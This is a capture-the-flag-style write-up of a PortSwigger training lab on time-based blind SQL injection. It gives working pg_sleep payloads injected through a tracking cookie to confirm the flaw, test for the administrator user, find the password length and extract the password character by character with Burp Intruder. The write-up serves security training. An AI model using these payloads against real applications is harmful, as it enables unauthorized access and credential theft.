[Source](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
## Task
This lab has a blind SQL injection vulnerability. The application uses tracking cookies for analytics and executes a SQL query containing the value of the sent cookie.

The results of the SQL query are not returned, and the application does not react differently depending on whether the query returns any rows or throws an error. However, since the query is executed synchronously, we can trigger conditional delays to extract the information we need based on them.

There is another table in the database called `users`, which contains `username` and `password` columns. We need to exploit a blind SQL injection vulnerability to find out the password of the user `administrator`.

You must be logged in as `administrator` to complete the task.
## Solution
Go to the task site
![[Pasted image 20241222194823.png]]
Refresh the page, intercept the request via `Burp Suite` and send it to `Repeater`
![[Pasted image 20241222195109.png]]
Introduce SQL injection into `TrackerId`:
```SQL
'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```
![[Pasted image 20241222195522.png]]
The page loads for 10 seconds. This means that the SQL injection works. If we enter another query, the page will load instantly (changed 1=1 to 1=2)
```SQL
'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```
Now let's check if there is a user with the username `administrator`
```SQL
'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```
![[Pasted image 20241222195942.png]]
The page loads in 10 seconds. So there is such a user. Now let's find out the length of his password
```SQL
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```
![[Pasted image 20241222200114.png]]
![[Pasted image 20241222200148.png]]
In total, there are 20 characters in the password of the user `administrator`.

Now we will pick up his password. For this we will use `Intruder`.
Sending a query
```SQL
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```
in `Intruder`:
![[Pasted image 20241222200414.png]]
This uses the `SUBSTRING()` function to extract one character from the password and check it against a specific value. Our attack will iterate over all positions and possible values, checking each one in turn.
In the `Payloads` tab, select `Simple list` and in `Payload settings [Simple list]` add characters from the `a-z` and `0-9` lists.
![[Pasted image 20241222200746.png]]
To monitor page load time, go to `Resource pool`.
![[Pasted image 20241222200821.png]]
Launch the attack. During the symbol search, one symbol will hang for 10 seconds and will not show the request code (200). This means that this symbol is correct.
Final password:
```Password
xjbip577r7gyzeo6kp0n
```
Log in as `administrator`
![[Pasted image 20241222201748.png]]
![[Pasted image 20241222201756.png]]